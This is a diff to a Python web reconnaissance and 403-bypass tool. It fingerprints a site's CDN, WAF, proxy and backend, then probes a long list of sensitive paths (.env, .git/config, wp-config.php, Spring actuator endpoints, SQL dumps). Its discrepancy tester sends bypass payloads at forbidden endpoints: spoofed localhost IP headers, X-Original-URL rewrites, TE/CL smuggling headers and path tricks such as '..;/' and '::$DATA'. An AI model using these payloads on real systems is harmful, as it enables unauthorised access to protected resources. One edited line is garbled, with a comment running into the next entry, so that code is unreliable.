@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Application Stack Traceroute v3.0 - Intelligent Reconstruction
+Application Stack Traceroute v3.2.c | Intelligent Reconstruction
 Next-Generation Infrastructure Analysis with Progressive Discovery
 
 FEATURES:
@@ -220,7 +220,7 @@ class ProgressiveStackAnalyzer:
                     'headers': ['ns_af', 'citrix_ns_id', 'netscaler'],
                     'response_codes': [403],
                     'body_patterns': ['netscaler', 'citrix', 'access denied'],
-              },
+                },
                 'fortinet_fortiweb': {
                    'headers': ['x-forwarded-for'],
                     'response_codes': [403],
@@ -1068,119 +1068,338 @@ class ProgressiveStackAnalyzer:
 
     def analyze_header_timeline(self, response: requests.Response) -> List[Dict]:
         """
-        Analyze header timeline to reconstruct processing chain.
-        Via, X-Forwarded-*, Server headers reveal the path.
+        Enhanced header timeline analysis to reconstruct processing chain.
+        Uses comprehensive fingerprinting and multi-step discovery for better accuracy.
         """
         timeline = []
-        
-        # Via header analysis (shows proxy chain)
-        via_header = response.headers.get('Via', '')
+        headers = response.headers
+        discovered_components = set()
+
+        # 1. Detection via Fingerprints (The most reliable source)
+        for category, providers in self.fingerprints.items():
+            for provider_name, patterns in providers.items():
+                match_found = False
+                
+                # Check headers
+                if 'headers' in patterns:
+                    for h_pattern in patterns['headers']:
+                        if isinstance(patterns['headers'], list):
+                            for h_name, h_value in headers.items():
+                                if h_pattern.lower() in h_name.lower():
+                                    match_found = True
+                                    break
+                        elif isinstance(patterns['headers'], dict):
+                            for h_name, expected_val in patterns['headers'].items():
+                                if h_name in headers and expected_val.lower() in headers[h_name].lower():
+                                    match_found = True
+                                    break
+                        if match_found: break
+
+                # Check cookies
+                if not match_found and 'cookies' in patterns:
+                    for c_pattern in patterns['cookies']:
+                        for cookie_name in response.cookies.keys():
+                            if c_pattern.lower() in cookie_name.lower():
+                                match_found = True
+                                break
+                        if match_found: break
+
+                # Specific check for backend_detection tech_headers
+                if not match_found and 'tech_headers' in patterns:
+                    for h_name, expected_val in patterns['tech_headers'].items():
+                        if h_name in headers and expected_val.lower() in headers[h_name].lower():
+                            match_found = True
+                            break
+
+                if match_found and provider_name not in discovered_components:
+                    discovered_components.add(provider_name)
+                    timeline.append({
+                        'order': self._get_layer_order(category),
+                        'type': category.split('_')[0],
+                        'name': provider_name,
+                        'evidence': f"Matched fingerprint: {provider_name}",
+                        'component': provider_name
+                    })
+
+        # 2. Detailed Via Header Analysis (Chain Discovery)
+        via_header = headers.get('Via', '')
         if via_header:
-            hops = via_header.split(',')
+            hops = [h.strip() for h in via_header.split(',')]
             for idx, hop in enumerate(hops):
-                hop = hop.strip()
+                comp = self._identify_from_via(hop)
                 timeline.append({
-                    'order': idx,
+                    'order': 50 + idx, # Proxies are middle-ground
                     'type': 'proxy',
                     'raw': hop,
-                    'component': self._identify_from_via(hop)
+                    'component': comp,
+                    'name': comp
                 })
-        
-        # X-Forwarded headers
-        xff = response.headers.get('X-Forwarded-For', '')
-        if xff:
-            timeline.append({
-                'order': len(timeline),
-                'type': 'proxy/lb',
-                'raw': f'X-Forwarded-For: {xff}',
-                'component': 'forwarding_proxy'
-            })
-        
-        # Server header (usually last in chain - origin)
-        server = response.headers.get('Server', '')
-        if server:
-            timeline.append({
-                'order': len(timeline),
-                'type': 'backend',
-                'raw': f'Server: {server}',
-                'component': self._identify_from_server(server)
-            })
-        
-        # CDN-specific headers (usually first in chain)
-        cdn_headers = {
-            'CF-Ray': 'cloudflare',
-            'X-Amz-Cf-Id': 'cloudfront',
-            'X-Served-By': 'fastly/akamai',
-            'X-Cache': 'generic_cdn'
+
+        # 3. Forwarding Analysis
+        for h_name in ['X-Forwarded-For', 'X-Forwarded-Host', 'X-Forwarded-Proto', 'Forwarded']:
+            if h_name in headers:
+                timeline.append({
+                    'order': 40,
+                    'type': 'forwarding',
+                    'raw': f"{h_name}: {headers[h_name]}",
+                    'component': 'forwarding_layer',
+                    'name': h_name.lower()
+                })
+
+        # 4. Infrastructure & Discovery Headers
+        discovery_map = {
+            'X-Served-By': {'type': 'infrastructure', 'order': 30},
+            'X-Backend-Server': {'type': 'infrastructure', 'order': 80},
+            'X-Request-ID': {'type': 'tracking', 'order': 10},
+            'X-Correlation-ID': {'type': 'tracking', 'order': 10},
+            'X-App-ID': {'type': 'infrastructure', 'order': 70},
+            'X-Envoy-Upstream-Service-Time': {'type': 'proxy', 'order': 55},
+            'X-Powered-By': {'type': 'framework', 'order': 90},
+            'X-Runtime': {'type': 'framework', 'order': 95},
+            'X-Varnish': {'type': 'cache', 'order': 60},
+            'X-Cache': {'type': 'cache', 'order': 60},
+            'X-Cache-Hits': {'type': 'cache', 'order': 60},
+            'X-Cache-Status': {'type': 'cache', 'order': 60},
+            'CF-Cache-Status': {'type': 'cache', 'order': 60},
+            'X-Azure-Ref': {'type': 'cdn/lb', 'order': 20},
+            'X-Amz-Cf-Id': {'type': 'cdn', 'order': 5},
+            'X-Ray-Id': {'type': 'cdn/waf', 'order': 5},
+            'Server': {'type': 'backend', 'order': 100}
         }
+
+        for h_name, info in discovery_map.items():
+            if h_name in headers:
+                val = headers[h_name]
+                # Avoid duplicates if already found via fingerprints
+                if not any(t.get('name') == h_name.lower() or t.get('raw', '').startswith(h_name) for t in timeline):
+                    timeline.append({
+                        'order': info['order'],
+                        'type': info['type'],
+                        'raw': f"{h_name}: {val}",
+                        'component': self._identify_from_value(h_name, val),
+                        'name': h_name.lower()
+                    })
+
+        # Sort timeline by order
+        timeline.sort(key=lambda x: x['order'])
         
-        for header, cdn_type in cdn_headers.items():
-            if header in response.headers:
-                timeline.insert(0, {  # CDN is always first
-                    'order': 0,
-                    'type': 'cdn',
-                    'raw': f'{header}: {response.headers[header]}',
-                    'component': cdn_type
-                })
-                break
-        
-        # WAF-specific headers
-        waf_headers = {
-            'X-WAF-Event-Info': 'generic_waf',
-            'X-Sucuri-ID': 'sucuri_waf',
-            'X-Denied-Reason': 'generic_waf'
+        # Deduplicate and normalize
+        seen = set()
+        unique_timeline = []
+        for entry in timeline:
+            key = (entry.get('type'), entry.get('component'))
+            if key not in seen:
+                seen.add(key)
+                unique_timeline.append(entry)
+
+        self.stack['timeline'] = unique_timeline
+        return unique_timeline
+
+    def _get_layer_order(self, category: str) -> int:
+        """Define logical order of infrastructure layers"""
+        orders = {
+            'cdn_detection': 5,
+            'waf_detection': 15,
+            'api_gateway_detection': 25,
+            'load_balancer_detection': 35,
+            'proxy_detection': 45,
+            'service_mesh_detection': 55,
+            'cache_layer_detection': 65,
+            'container_orchestration_detection': 75,
+            'serverless_detection': 85,
+            'microservice_detection': 95,
+            'backend_detection': 100
         }
+        return orders.get(category, 50)
+
+    def _identify_from_value(self, header: str, value: str) -> str:
+        """Extract component name from header value"""
+        if header == 'Server':
+            return self._identify_from_server(value)
+        if header == 'Via':
+            return self._identify_from_via(value)
         
-        for header, waf_type in waf_headers.items():
-            if header in response.headers:
-                # WAF usually after CDN but before backend
-                insert_pos = 1 if timeline and timeline[0]['type'] == 'cdn' else 0
-                timeline.insert(insert_pos, {
-                    'order': insert_pos,
-                    'type': 'waf',
-                    'raw': f'{header}: {response.headers[header]}',
-                    'component': waf_type
-                })
-                break
+        # Simple extraction for other headers
+        value_lower = value.lower()
+        if 'nginx' in value_lower: return 'nginx'
+        if 'apache' in value_lower: return 'apache'
+        if 'cloudflare' in value_lower: return 'cloudflare'
+        if 'varnish' in value_lower: return 'varnish'
+        if 'haproxy' in value_lower: return 'haproxy'
         
-        self.stack['timeline'] = timeline
-        return timeline
+        return value.split(' ')[0].split('/')[0].lower()
+
     
     def _identify_from_via(self, via_string: str) -> str:
-        """Identify component from Via header"""
+        """
+        Enhanced identification of infrastructure components from Via header.
+        Expanded discovery for CDNs, Proxies, LBs and Security Appliances.
+        """
         via_lower = via_string.lower()
         
+        # Comprehensive mapping of Via header signatures
         identifiers = {
-            'cloudflare': 'cloudflare',
+            # CDNs & Global Edge
+            'cloudflare': 'cloudflare_edge',
+            'cloudfront': 'aws_cloudfront',
+            'akamai': 'akamai_edge',
+            'fastly': 'fastly_edge',
+            'google': 'google_cloud_lb',
+            'edgecast': 'verizon_edgecast',
+            'bitgravity': 'bitgravity_cdn',
+            'bunnycdn': 'bunny_cdn',
+            'sucuri': 'sucuri_waf_edge',
+            
+            # Proxies & Caches
             'nginx': 'nginx_proxy',
             'squid': 'squid_proxy',
             'varnish': 'varnish_cache',
+            'ats': 'apache_traffic_server',
+            'trafficserver': 'apache_traffic_server',
+            'envoy': 'envoy_proxy',
             'haproxy': 'haproxy_lb',
-            'envoy': 'envoy_proxy'
+            'tinyproxy': 'tinyproxy',
+            'privoxy': 'privoxy',
+            'polipo': 'polipo_proxy',
+            
+            # API Gateways & Service Mesh
+            'kong': 'kong_gateway',
+            'tyk': 'tyk_gateway',
+            'traefik': 'traefik_proxy',
+            'ambassador': 'ambassador_gateway',
+            'istio': 'istio_proxy',
+            'linkerd': 'linkerd_proxy',
+            
+            # Security & Enterprise Appliances
+            'bluecoat': 'bluecoat_proxy',
+            'proxysg': 'bluecoat_proxy',
+            'zscaler': 'zscaler_cloud_proxy',
+            'mcafee': 'mcafee_web_gateway',
+            'ironport': 'cisco_ironport',
+            'sophos': 'sophos_utm',
+            'fortigate': 'fortigate_waf',
+            'barracuda': 'barracuda_waf',
+            'f5': 'f5_bigip_asm',
+            'netscaler': 'citrix_netscaler',
+            'isaserver': 'microsoft_isa_server',
+            'forefront': 'microsoft_tmg',
+            
+            # Cloud Provider Specific
+            'gclb': 'google_cloud_lb',
+            'azure': 'azure_front_door',
+            'msedge': 'azure_edge',
         }
         
+        # 1. Direct pattern matching
         for pattern, component in identifiers.items():
             if pattern in via_lower:
                 return component
+                
+        # 2. Version extraction and regex-based discovery
+        # Example: 1.1 proxy.example.com (squid/3.5.23)
+        version_match = re.search(r'\((.*?)\)', via_string)
+        if version_match:
+            comment = version_match.group(1).lower()
+            for pattern, component in identifiers.items():
+                if pattern in comment:
+                    return component
+            return f"proxy_via_{comment.split('/')[0]}"
+
+        # 3. Protocol-based fallback
+        if via_lower.startswith('1.0') or via_lower.startswith('1.1'):
+            return 'http_proxy_generic'
+        if via_lower.startswith('2') or 'h2' in via_lower:
+            return 'http2_proxy_edge'
         
-        return 'unknown_proxy'
+        return 'unknown_infrastructure'
     
     def _identify_from_server(self, server_string: str) -> str:
-        """Identify backend from Server header"""
+        """
+        Enhanced backend identification from Server header.
+        Maps web servers, application servers, and language runtimes.
+        """
         server_lower = server_string.lower()
         
+        # Comprehensive mapping of Server header signatures
         identifiers = {
-            'nginx': 'nginx_backend',
-            'apache': 'apache_backend',
-            'microsoft-iis': 'iis_backend',
+            # Standard Web Servers
+            'nginx': 'nginx_web_server',
+            'apache': 'apache_httpd',
+            'microsoft-iis': 'ms_iis',
+            'lighttpd': 'lighttpd',
+            'caddy': 'caddy_server',
+            'openresty': 'openresty_lua',
+            'litespeed': 'litespeed_web_server',
+            'tengine': 'tengine_nginx_fork',
+            'cherokee': 'cherokee_web_server',
+            'hiawatha': 'hiawatha_web_server',
+            
+            # Application Servers (Java/JEE)
+            'tomcat': 'apache_tomcat',
+            'apache-coyote': 'apache_tomcat_coyote',
+            'jetty': 'eclipse_jetty',
+            'glassfish': 'oracle_glassfish',
+            'wildfly': 'jboss_wildfly',
+            'jboss': 'jboss_as',
+            'resin': 'caucho_resin',
+            'weblogic': 'oracle_weblogic',
+            'websphere': 'ibm_websphere',
+            
+            # Python Application Servers
+            'gunicorn': 'gunicorn_wsgi',
+            'uvicorn': 'uvicorn_asgi',
+            'waitress': 'waitress_wsgi',
+            'werkzeug': 'werkzeug_dev_server',
+            'daphne': 'daphne_asgi',
+            
+            # Ruby Application Servers
+            'puma': 'puma_ruby',
+            'passenger': 'phusion_passenger',
+            'thin': 'thin_ruby',
+            'webrick': 'webrick_ruby',
+            
+            # .NET / Windows
+            'kestrel': 'aspnet_core_kestrel',
+            
+            # Node.js / Other
+            'express': 'nodejs_express',
+            'next.js': 'nodejs_nextjs',
+            'cowboy': 'erlang_cowboy',
+            
+            # CDN/WAF acting as Server
             'cloudflare': 'cloudflare_workers',
-            'openresty': 'openresty_backend'
+            'akamai': 'akamai_ghost',
+            'cloudfront': 'aws_cloudfront',
+            'ecs': 'edgecast_cdn',
+            'arvancloud': 'arvancloud_waf',
+            'sucuri': 'sucuri_cloudproxy'
         }
         
+        # 1. Direct pattern matching
         for pattern, component in identifiers.items():
             if pattern in server_lower:
-                return component
+                # Extra check for version
+                version = "unknown"
+                version_match = re.search(r'/([\d.]+)', server_string)
+                if version_match:
+                    version = version_match.group(1)
+                return f"{component}/{version}" if version != "unknown" else component
+                
+        # 2. Specialized identification for composite headers (e.g., Nginx + PHP)
+        if 'php' in server_lower:
+            return 'php_backend_generic'
         
+        # 3. Check for signatures like "Python/3.x" or "Go-http-client"
+        runtime_match = re.search(r'(python|php|ruby|go|node\.js|perl|java)/([\d.]+)', server_lower)
+        if runtime_match:
+            return f"{runtime_match.group(1)}_runtime/{runtime_match.group(2)}"
+
+        # 4. Handle obfuscated/custom servers
+        if server_string and len(server_string) > 0:
+            # If it doesn't match known patterns but looks like a name
+            if re.match(r'^[a-zA-Z0-9_\-]+$', server_string):
+                return f"custom_server_{server_lower}"
+
         return 'unknown_backend'
     
     def progressive_fingerprinting(self, baseline_response: requests.Response):
@@ -1698,24 +1917,48 @@ class ProgressiveStackAnalyzer:
         return latencies
 
     def _attribute_headers(self, layer: Dict, position: int) -> List[str]:
-        """Determine which headers this layer likely added"""
+        """
+        Determine which headers this layer likely added by dynamically 
+        extracting them from the comprehensive fingerprints database.
+        """
         header_attribution = []
-        layer_type = layer['type']
-
-        # Known header patterns per layer
-        header_signatures = {
-            'CDN': ['cf-', 'x-amz-cf-', 'x-cache', 'x-served-by', 'akamai-'],
-            'WAF': ['x-waf-', 'x-sucuri-', 'incap-', 'cf-mitigated'],
-            'LOAD_BALANCER': ['x-forwarded-', 'x-haproxy-', 'x-nginx-lb'],
-            'PROXY': ['via', 'x-varnish', 'x-squid'],
-            'BACKEND': ['server', 'x-powered-by', 'x-runtime']
+        layer_type = layer['type'].upper()
+        
+        # Map layer types to fingerprint categories
+        type_mapping = {
+            'CDN': ['cdn_detection'],
+            'WAF': ['waf_detection'],
+            'LOAD_BALANCER': ['load_balancer_detection'],
+            'PROXY': ['proxy_detection', 'api_gateway_detection', 'service_mesh_detection'],
+            'BACKEND': ['backend_detection', 'microservice_detection', 'serverless_detection']
         }
+        
+        relevant_categories = type_mapping.get(layer_type, [])
+        
+        # Dynamically build the signature list from self.fingerprints
+        for category in relevant_categories:
+            if category in self.fingerprints:
+                for provider in self.fingerprints[category].values():
+                    # Extract from 'headers' list if available
+                    if 'headers' in provider:
+                        if isinstance(provider['headers'], list):
+                            header_attribution.extend(provider['headers'])
+                        elif isinstance(provider['headers'], dict):
+                            header_attribution.extend(provider['headers'].keys())
+                    
+                    # Extract from 'tech_headers' (common in backend_detection)
+                    if 'tech_headers' in provider:
+                        header_attribution.extend(provider['tech_headers'].keys())
 
-        patterns = header_signatures.get(layer_type, [])
-        for pattern in patterns:
-            header_attribution.append(pattern.rstrip('-'))
-
-        return header_attribution
+        # Clean and deduplicate (removing versions or values from header names)
+        cleaned_headers = []
+        for h in header_attribution:
+            # Take only the header name part before any colon or space
+            clean_name = h.split(':')[0].strip().lower()
+            if clean_name and clean_name not in cleaned_headers:
+                cleaned_headers.append(clean_name)
+        
+        return cleaned_headers
 
     def _determine_responsibility(self, layer: Dict) -> str:
         """Determine layer's role in request processing"""
@@ -1756,12 +1999,167 @@ class ForbiddenEndpointFinder:
         
         # Common forbidden paths
         common_paths = [
+
+            # Database administration
+            '/phpmyadmin', '/pma', '/adminer', '/mysql', '/database',
+            '/db', '/dbadmin', '/sqlmanager', '/myadmin', '/phpMyAdmin',
+            '/mysqladmin', '/sql', '/db_admin', '/database_administration',
+            
+            # User management and authentication
+            '/users', '/user', '/accounts', '/account', '/profile', '/profiles',
+            '/login', '/signin', '/auth', '/authentication', '/oauth',
+            '/sso', '/saml', '/ldap', '/register', '/signup',
+            
+            # API endpoints
+            '/api', '/api/v1', '/api/v2', '/api/admin', '/api/internal',
+            '/api/private', '/api/user', '/api/users', '/api/auth',
+            '/api/login', '/api/admin/users', '/api/config', '/api/settings',
+            '/graphql', '/graphiql', '/playground', '/altair',
+            
+            # Content Management Systems (CMS)
+            '/wp-admin', '/wp-login.php', '/wp-content', '/wp-includes',
+            '/wp-json', '/xmlrpc.php', '/wp-cron.php',
+            '/drupal', '/sites/default', '/node', '/user/login',
+            '/joomla', '/joomla/administrator', '/typo3', '/umbraco',
+            
+            # Development and staging
+            '/dev', '/development', '/test', '/testing', '/stage', '/staging',
+            '/debug', '/trace', '/logs', '/log', '/monitoring',
+            '/health', '/status', '/info', '/version', '/build',
+            
+            # System directories
+            '/pages', '/root', '/home', '/var', '/etc', '/tmp',
+            '/uploads', '/upload', '/files', '/documents', '/media',
+            '/images', '/assets', '/static', '/resources',
+            '/includes', '/lib', '/libraries', '/vendor',
+            '/cgi-bin', '/cgi', '/bin', '/scripts',
+            
+            # Backup and archive files
+            '/backup', '/backups', '/bak', '/old', '/archive',
+            '/dump', '/sql', '/.bak', '/backup.zip', '/backup.tar.gz',
+            '/db_backup.sql', '/database.sql', '/data.sql',
+            
+            # Server status and monitoring
+            '/server-status', '/server-info', '/status', '/stats',
+            '/metrics', '/health', '/ping', '/heartbeat',
+            '/actuator', '/actuator/health', '/actuator/info', '/actuator/metrics',
+            '/management', '/jolokia', '/hawtio',
+            
+            # Framework specific endpoints
+            # Spring Boot
+            '/actuator', '/actuator/beans', '/actuator/env', '/actuator/configprops',
+            '/actuator/mappings', '/actuator/sessions', '/actuator/shutdown',
+            '/actuator/trace', '/actuator/dump', '/actuator/jolokia',
+            '/actuator/logfile', '/actuator/refresh', '/actuator/restart',
+            
+            # Django
+            '/django-admin', '/__debug__', '/admin/doc', '/admin/auth',
+            
+            # Laravel
+            '/telescope', '/horizon', '/nova', '/log-viewer',
+            
+            # Node.js/Express
+            '/debug', '/_debugger', '/inspector', '/profiler',
+            
+            # Flask
+            '/admin', '/admin/login', '/_debug_toolbar',
+            
+            # Documentation endpoints
+            '/docs', '/doc', '/documentation', '/swagger', '/swagger-ui',
+            '/swagger.json', '/swagger.yaml', '/openapi.json',
+            '/redoc', '/api-docs', '/apidocs', '/api/docs',
+            
+            # Security tools and panels
+            '/security', '/firewall', '/waf', '/ids', '/ips',
+            '/antivirus', '/scanner', '/audit', '/compliance',
+            
+            # Cloud and container specific
+            '/kubernetes', '/k8s', '/docker', '/containers',
+            '/pods', '/services', '/ingress', '/metrics-server',
+            '/prometheus', '/grafana', '/jaeger', '/zipkin',
+            
+            # CI/CD and DevOps
+            '/jenkins', '/bamboo', '/teamcity', '/gitlab',
+            '/github', '/bitbucket', '/azure-devops', '/travis',
+            '/circleci', '/drone', '/argo', '/tekton',
+            
+            # Specific application panels
+            '/nagios', '/zabbix', '/cacti', '/munin', '/icinga',
+            '/kibana', '/elasticsearch', '/logstash', '/splunk',
+            '/sonarqube', '/nexus', '/artifactory', '/harbor',
+            
+            # E-commerce specific
+            '/checkout', '/payment', '/billing', '/invoice',
+            '/orders', '/cart', '/wishlist', '/customer',
+            '/merchant', '/vendor', '/seller',
+            
+            # Communication tools
+            '/mail', '/webmail', '/roundcube', '/squirrelmail',
+            '/horde', '/zimbra', '/exchange', '/outlook',
+            '/chat', '/slack', '/teams', '/discord',
+            
+            # File management
+            '/filemanager', '/ftp', '/sftp', '/files', '/explorer',
+            '/finder', '/directory', '/browse', '/tree',
+            
+            # Miscellaneous sensitive paths
+            '/internal', '/intranet', '/extranet', '/partner',
+            '/client', '/customer', '/member', '/premium',
+            '/vip', '/executive', '/board', '/leadership',
+            '/hr', '/finance', '/accounting', '/legal',
+            
+            # Version control and source code
+            '/.svn', '/.hg', '/.bzr', '/CVS',
+            '/src', '/source', '/sources', '/code',
+            
+            # Cache and temporary files
+            '/cache', '/tmp', '/temp', '/temporary',
+            '/session', '/sessions', '/var/cache', '/var/tmp',
+            
+            # Mobile and API gateways
+            '/mobile', '/m', '/api/mobile', '/mobile-api',
+            '/gateway', '/proxy', '/reverse-proxy',
+            
+            # Analytics and tracking
+            '/analytics', '/tracking', '/stats', '/reports',
+            '/dashboard', '/overview', '/summary',
+            
+            # Backup services
+            '/backup', '/restore', '/snapshot', '/clone',
+            '/export', '/import', '/migrate', '/sync',
+            
+            # Third-party integrations
+            '/oauth2', '/openid', '/cas', '/radius',
+            '/active-directory', '/ldap', '/saml2',
+            '/facebook', '/google', '/twitter', '/linkedin',
+            '/github', '/gitlab', '/bitbucket',
+            
+            # Error and debug pages
+            '/error', '/errors', '/404', '/500', '/debug',
+            '/trace', '/exception', '/stacktrace',
+            
+            # Testing and QA
+            '/qa', '/quality', '/test-results', '/coverage',
+            '/performance', '/load-test', '/stress-test',
+            
+            # Additional file extensions that might be protected
+            '/.DS_Store', '/thumbs.db', '/.vscode', '/.idea',
+            '/composer.json', '/package.json', '/yarn.lock',
+            '/Gemfile', '/requirements.txt', '/pom.xml',
+            '/build.gradle', '/Dockerfile', '/docker-compose.yml',
+                        # Original admin endpoints
             '/admin', '/wp-admin', '/administrator', '/secure', '/api/admin',
             '/manage', '/console', '/portal', '/control', '/private',
             '/restricted', '/staff', '/backend', '/cpanel', '/webadmin',
-            '/.env', '/.git', '/config', '/phpmyadmin', '/adminer',
-            '/api/v1/admin', '/api/admin', '/admin.php', '/login',
-            '/secret', '/internal', '/debug', '/test'
+            
+            # Configuration and sensitive files
+            '/.env', '/.env.local', '/.env.production', '/.env.backup',
+            '/.git', '/.git/config', '/.gitignore', '/.gitlab-ci.yml',
+            '/config', '/config.php', '/config.json', '/config.yml',
+            '/configuration.php', '/wp-config.php', '/app.config',
+            '/.htaccess', '/.htpasswd', '/web.config', '/robots.txt',
+            '/sitemap.xml', '/.well-known'
+        
         ]
         
         print(f"  🔎 Testing {len(common_paths)} common forbidden paths...")
@@ -2007,76 +2405,160 @@ class DiscrepancyTester:
         return self.discrepancies
     
     def test_header_confusion(self):
-        """Test header parsing discrepancies - EXPANDED"""
-        print("\n  🔬 Testing Header Confusion...")
+        """
+        Advanced testing for header parsing discrepancies, smuggling, 
+        and proxy bypass signatures.
+        """
+        print("\n  🔬 Testing Header Confusion & Proxy Bypasses...")
 
+        # Each test can have a dict of headers or a list of tuples for duplicate headers
         header_tests = [
+            # 1. Smuggling & Parsing Discrepancies
             {
-                'name': 'Double Content-Type',
+                'name': 'TE.CL Smuggling (Chunked, Identity)',
+                'headers': {'Transfer-Encoding': 'chunked, identity', 'Content-Length': '5'}
+            },
+            {
+                'name': 'CL.TE Smuggling (Zero CL)',
+                'headers': {'Content-Length': '0', 'Transfer-Encoding': 'chunked'}
+            },
+            {
+                'name': 'Header Name Obfuscation (Tab)',
+                'headers': {'X-Forwarded-For\t': '127.0.0.1'}
+            },
+            {
+                'name': 'Header Value Obfuscation (Prefix Space)',
+                'headers': {'X-Forwarded-For': ' 127.0.0.1'}
+            },
+            {
+                'name': 'Case Sensitivity Test',
+                'headers': {'tRaNsFeR-eNcOdInG': 'chunked'}
+            },
+
+            # 2. Path & URL Rewrite Bypasses
+            {
+                'name': 'X-Original-URL Bypass',
+                'headers': {'X-Original-URL': self.forbidden_endpoint.split(self.target_url)[-1]}
+            },
+            {
+                'name': 'X-Rewrite-URL Bypass',
+                'headers': {'X-Rewrite-URL': self.forbidden_endpoint.split(self.target_url)[-1]}
+            },
+            {
+                'name': 'X-Forwarded-Server Override',
+                'headers': {'X-Forwarded-Server': 'localhost'}
+            },
+
+            # 3. IP/Identity Spoofing
+            {
+                'name': 'Multi-Proxy Chain Spoofing',
+                'headers': {
+                    'X-Forwarded-For': '127.0.0.1, 10.0.0.1, 192.168.1.1',
+                    'X-Real-IP': '127.0.0.1',
+                    'Client-IP': '127.0.0.1'
+                }
+            },
+            {
+                'name': 'Source IP Confusion',
+                'headers': {
+                    'X-Originating-IP': '127.0.0.1',
+                    'X-Remote-IP': '127.0.0.1',
+                    'X-Remote-Addr': '127.0.0.1',
+                    'X-Client-IP': '127.0.0.1',
+                    'True-Client-IP': '127.0.0.1'
+                }
+            },
+
+            # 4. Hop-by-Hop Header Manipulation
+            {
+                'name': 'Connection-based Header Dropping',
+                'headers': {
+                    'Connection': 'close, X-Forwarded-For',
+                    'X-Forwarded-For': '127.0.0.1'
+                }
+            },
+            {
+                'name': 'Hop-by-Hop Te Manipulation',
+                'headers': {'Connection': 'TE', 'TE': 'trailers'}
+            },
+
+            # 5. Infrastructure Specific Confusion
+            {
+                'name': 'Cloudflare Internal Bypass Attempt',
+                'headers': {'CF-Connecting-IP': '127.0.0.1', 'X-Forwarded-Proto': 'http'}
+            },
+            {
+                'name': 'Akamai Network-Override',
+                'headers': {'Akamai-Origin-Hop': '1', 'X-Akamai-Edge-Check': 'true'}
+            },
+            {
+                'name': 'Fastly Debug Bypass',
+                'headers': {'Fastly-Debug': '1', 'X-Timer': 'S1'}
+            },
+
+            # 6. Content-Type Confusion (Using variations instead of duplicate keys)
+            {
+                'name': 'Content-Type Multiplexing',
                 'headers': {
                     'Content-Type': 'application/json',
-                    'Content-Type': 'application/x-www-form-urlencoded'
+                    'content-type': 'application/x-www-form-urlencoded'
                 }
             },
+
+            # 7. Protocol Downgrade/Upgrade Confusion
             {
-                'name': 'Host Override',
-                'headers': {
-                    'Host': 'localhost',
-                    'X-Forwarded-Host': self.target_url.split('//')[1].split('/')[0]
-                }
+                'name': 'Upgrade-Insecure-Requests',
+                'headers': {'Upgrade-Insecure-Requests': '1'}
             },
             {
-                'name': 'Method Override',
-                'headers': {
-                    'X-HTTP-Method-Override': 'GET',
-                    'X-Method-Override': 'GET'
-                }
-            },
-            {
-                'name': 'Content-Length Mismatch',
-                'headers': {
-                    'Content-Length': '0',
-                    'Transfer-Encoding': 'chunked'
-                }
-            },
-            # EXPANDED: New tests
-            {
-                'name': 'Transfer-Encoding Chunked Variations',
-                'headers': {
-                    'Transfer-Encoding': 'chunked, identity'
-                }
-            },
-            {
-                'name': 'Range Header Abuse',
-                'headers': {
-                    'Range': 'bytes=0-0'
-                }
-            },
-            {
-                'name': 'Connection Manipulation',
-                'headers': {
-                    'Connection': 'close, TE',
-                    'TE': 'chunked'
-                }
+                'name': 'Protocol Header Confusion',
+                'headers': {'X-Forwarded-Proto': 'https', 'Forwarded': 'proto=http'}
             }
         ]
         
         for test in header_tests:
             try:
-                response = self.session.get(self.forbidden_endpoint, headers=test['headers'], timeout=5)
+                # Use a new request to avoid session header pollution
+                response = self.session.get(
+                    self.forbidden_endpoint, 
+                    headers=test['headers'], 
+                    timeout=5,
+                    allow_redirects=False
+                )
                 
-                # Look for unusual responses indicating discrepancy
-                if response.status_code not in [403, 401]:
+                # Analyze results for potential bypass or leakage
+                status = response.status_code
+                content_len = len(response.content)
+                
+                # Check for bypass (status code change)
+                if status not in [400, 401, 403, 429]:
+                    severity = 'CRITICAL' if status == 200 else 'HIGH'
                     self.discrepancies.append({
-                        'type': 'Header Confusion',
+                        'type': 'Header Confusion Bypass',
                         'test_name': test['name'],
                         'forbidden_url': self.forbidden_endpoint,
                         'headers': test['headers'],
-                        'response_code': response.status_code,
-                        'severity': 'HIGH' if response.status_code == 200 else 'MEDIUM'
+                        'response_code': status,
+                        'severity': severity,
+                        'evidence': f"Bypassed 403 with status {status}"
                     })
-                    print(f"    ✅ Discrepancy found: {test['name']} → {response.status_code}")
+                    print(f"    [!] Potential Bypass: {test['name']} -> {status}")
+                
+                # Check for Information Leakage (different response body length)
+                # (Note: self.baseline_forbidden_size should be defined during discovery)
+                if hasattr(self, 'baseline_forbidden_size') and abs(content_len - self.baseline_forbidden_size) > 100:
+                    self.discrepancies.append({
+                        'type': 'Header Confusion Leak',
+                        'test_name': test['name'],
+                        'forbidden_url': self.forbidden_endpoint,
+                        'response_code': status,
+                        'severity': 'MEDIUM',
+                        'evidence': f"Response length change: {content_len} vs {self.baseline_forbidden_size}"
+                    })
+                    print(f"    [?] Potential Leakage: {test['name']} (Length changed)")
+
             except Exception as e:
+                # print(f"    [x] Test failed: {test['name']} ({str(e)})")
                 pass
     
     def test_method_confusion(self):
@@ -2093,7 +2575,7 @@ class DiscrepancyTester:
                 results[method] = response.status_code
                 
                 # If any method bypasses forbidden
-                if response.status_code not in [403, 401, 405]:
+                if response.status_code not in [401, 403, 405, 429]:
                     self.discrepancies.append({
                         'type': 'Method Confusion',
                         'method': method,
@@ -2133,7 +2615,38 @@ class DiscrepancyTester:
             base_path + ';',  # Path parameter separator
             base_path.replace('/', '%2F'),  # Encoded slash
             base_path + '%0a',  # Newline injection
-            base_path.replace('/', '/./'),  # Dot segments
+            base_path.replace('/', '/./'),  # Dot segmentsbase_path + '/..',
+            base_path + '/../',
+            base_path + '/./..',
+            base_path + '/././',
+            base_path + '/..;/',
+            base_path + '/.;/',
+            base_path + '/./;/',
+            base_path.replace('/', '/././'),
+            base_path + ';',
+            base_path + ';/',
+            base_path + ';jsessionid=ABC',
+            base_path.replace('/', ';jsessionid=ABC/'),
+            base_path + ';v=1',
+            base_path + ';anything',
+            base_path.replace('/', '\\'),
+            base_path.replace('/', '\\\\'),
+            base_path.replace('/', '/\\'),
+            base_path.replace('/', '\\/'),
+            base_path + '/..\\',
+            base_path + '\\..\\',
+            base_path + '.',
+            base_path + '..',
+            base_path + '...',
+            base_path + '....//',
+            base_path + '::$DATA',
+            base_path + '?/',
+            base_path + '??',
+            base_path + '?.',
+            base_path + ';/',
+            base_path + '#/',
+            base_path + '%23/',
+            base_path + '::$INDEX_ALLOCATION'
         ]
         
